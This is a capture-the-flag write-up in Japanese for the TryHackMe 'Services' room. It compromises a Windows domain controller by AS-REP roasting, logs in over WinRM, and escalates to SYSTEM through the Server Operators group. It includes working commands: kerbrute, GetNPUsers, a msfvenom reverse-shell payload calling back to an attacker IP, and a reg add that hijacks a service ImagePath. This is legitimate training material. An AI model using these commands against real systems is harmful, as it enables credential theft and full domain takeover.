# Services CTF

https://tryhackme.com/room/services

## Enumeration

```shell
TARGET=10.201.56.24
sudo bash -c "echo $TARGET   services.thm >> /etc/hosts"
```

### ポートスキャン

多数のポートが開いている。

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49673/tcp open  unknown          syn-ack ttl 128
49674/tcp open  unknown          syn-ack ttl 128
49684/tcp open  unknown          syn-ack ttl 128
49685/tcp open  unknown          syn-ack ttl 128
49690/tcp open  unknown          syn-ack ttl 128
49699/tcp open  unknown          syn-ack ttl 128
```

```sh
sudo nmap -sS -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49673,49674,49684,49685,49690,49699 $TARGET

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-14 00:54:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
```

Kerberos, LDAP は気になる。

### ディレクトリ列挙

興味深いものは何も出なかった。

プロフィールページで4人の名前があった。

- `Joanne Doe` (Sales)
- `Jack Rock` (IT Staff)
- `Will Masters` (CEO)
- `Johnny LaRusso` (Marketing)

`j.doe@services.local` というメールアドレスも確認。

### SMB

何も出なかった。

```sh
$ smbclient -L //$TARGET -N     
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.56.24 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

enum4linuxの結果

```sh
Domain Name: SERVICES                                                                                                                                                                                                                     
Domain Sid: S-1-5-21-1966530601-3185510712-10604624

[+] Host is part of a domain (not a workgroup)
```

### LDAP列挙

```sh
$ ldapsearch -x -H ldap://$TARGET -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
（中略）
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=services,DC=loca
 l
serverName: CN=WIN-SERVICES,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=
 Configuration,DC=services,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=services,DC=local
namingContexts: DC=services,DC=local
namingContexts: CN=Configuration,DC=services,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=services,DC=local
namingContexts: DC=DomainDnsZones,DC=services,DC=local
namingContexts: DC=ForestDnsZones,DC=services,DC=local
isSynchronized: TRUE
highestCommittedUSN: 24623
dsServiceName: CN=NTDS Settings,CN=WIN-SERVICES,CN=Servers,CN=Default-First-Si
 te-Name,CN=Sites,CN=Configuration,DC=services,DC=local
dnsHostName: WIN-SERVICES.services.local
defaultNamingContext: DC=services,DC=local
currentTime: 20251114011558.0Z
configurationNamingContext: CN=Configuration,DC=services,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### 名前列挙

Webページから作った名前リストを用いて、名前を列挙。3人が見つかった。

```sh
$ kerbrute userenum --dc $TARGET -d services.local ./names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/14/25 - Ronnie Flathers @ropnop

2025/11/14 10:43:16 >  Using KDC(s):
2025/11/14 10:43:16 >   10.201.56.24:88

2025/11/14 10:43:17 >  [+] VALID USERNAME:       j.doe@services.local
2025/11/14 10:43:17 >  [+] VALID USERNAME:       j.larusso@services.local
2025/11/14 10:43:18 >  [+] VALID USERNAME:       j.rock@services.local
2025/11/14 10:43:18 >  Done! Tested 12 usernames (3 valid) in 1.176 seconds
```

### AS-REP Roasting 攻撃

j.rock のチケットを取得できた。このハッシュは rockyou.txt でクラックでき、パスワードを入手した。

```sh
$ GetNPUsers.py -dc-ip $TARGET services.local/ -usersfile ./names.txt
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/myenv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$j.rock@SERVICES.LOCAL:dbdec[REDACTED]
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## winrm

入手したパスワードを使い、winrm でシェル取得できた。

```sh
$ evil-winrm -i $TARGET -u j.rock -p [REDACTED]
```

デスクトップでユーザーフラグを入手。

## 権限昇格

### 権限
権限確認。SeShutdownは場合によっては[機密情報をリーク](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeShutdownPrivilegePoC)する可能性があるようだが、保留。

```sh
*Evil-WinRM* PS C:\Users\j.rock\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeSystemtimePrivilege         Change the system time              Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

グループ。

```sh
*Evil-WinRM* PS C:\Users\j.rock\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                    Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

### ケルベロースティング

ケルベロースティングでは何も得られなかった。

```sh
$ impacket-GetUserSPNs -dc-ip $TARGET services.local/j.rock
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
No entries found!
```

### PrivescCheck

PrivescCheck を実行。

サービスレジストリに関して、BUILTIN\Server Operators にSetValueが認められている。

```sh
Name              : AppVClient
ImagePath         : C:\Windows\system32\AppVClient.exe
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\AppVClient
IdentityReference : BUILTIN\Server Operators (S-1-5-32-549)
Permissions       : QueryValue, SetValue, CreateSubKey, EnumerateSubKeys, Notify, Delete, ReadControl, GenericWrite, GenericRead
Status            : Stopped
UserCanStart      : True
UserCanStop       : False

Name              : PrintWorkflowUserSvc
ImagePath         : C:\Windows\system32\svchost.exe -k PrintWorkflow
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\PrintWorkflowUserSvc
IdentityReference : BUILTIN\Server Operators (S-1-5-32-549)
Permissions       : QueryValue, SetValue, CreateSubKey, EnumerateSubKeys, Notify, Delete, ReadControl, GenericWrite, GenericRead
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
```

サービス一覧

※下記はすでにPATHが変わっている状態。AppVClient、PrintWorkflowUserSvcも試したが、cfn-hupのみ成功した。


```sh
*Evil-WinRM* PS C:\Users\j.rock\Documents> services

Path                                                                           Privileges Service             
----                                                                           ---------- -------             
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS                
"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                   True AmazonSSMAgent      
C:\Users\j.rock\Documents\srv.exe                                                    True AppVClient          
"C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                     True AWSLiteAgent        
"C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"                                   True cfn-hup             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing   
C:\Windows\SysWow64\perfhost.exe                                                     True PerfHost            
C:\Users\j.rock\Documents\srv.exe                                                    True PrintWorkflowUserSvc
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense               
C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller    
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\NisSrv.exe"        True WdNisSvc            
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe"       True WinDefend           
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc
```

サービス用リバースシェル作成

```sh
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.146.32 LPORT=8888 -f exe-service > srv.exe
```

バイナリをレジストリに登録

```sh
*Evil-WinRM* PS C:\Users\j.rock\Documents> reg add HKLM\SYSTEM\CurrentControlSet\services\cfn-hup /v ImagePath /t REG_EXPAND_SZ /d C:\Users\j.rock\Documents\srv.exe /f
The operation completed successfully.
```

サービスを開始

```sh
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe start cfn-hup

SERVICE_NAME: cfn-hup
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4936
        FLAGS              :
```

リバースシェル取得成功

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.11.146.32; set LPORT 8888;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
LHOST => 10.11.146.32
LPORT => 8888
[*] Started reverse TCP handler on 10.11.146.32:8888 
[*] Command shell session 1 opened (10.11.146.32:8888 -> 10.201.56.24:54038) at 2025-11-14 14:06:34 +0900


Shell Banner:
Microsoft Windows [Version 10.0.17763.4010]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system
```

## 振り返り

- `sc start` では反応せず、`sc.exe start` だと動くという挙動のためハマった。sc が Powershell のエイリアスになっていたため。

```ps
*Evil-WinRM* PS C:\Users\j.rock\Documents> Get-Command sc

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           sc -> Set-Content
```

- サービスが起動できるかどうかの見分け方について。

START_TYPE が DISABLED の場合は、起動できない。

```sh
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe qc AppVClient
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppVClient
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 4   DISABLED
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\j.rock\Documents\srv.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Microsoft App-V Client
        DEPENDENCIES       : RpcSS
                           : netprofm
                           : AppvVfs
                           : AppVStrm
        SERVICE_START_NAME : LocalSystem
```

cfn-hup を開始できたのは、DEMAND_START だったから。

```sh
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe qc cfn-hup
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: cfn-hup
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Users\j.rock\Documents\srv.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : CloudFormation cfn-hup
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

## Tags

#tags:Kerberos #tags:Windows
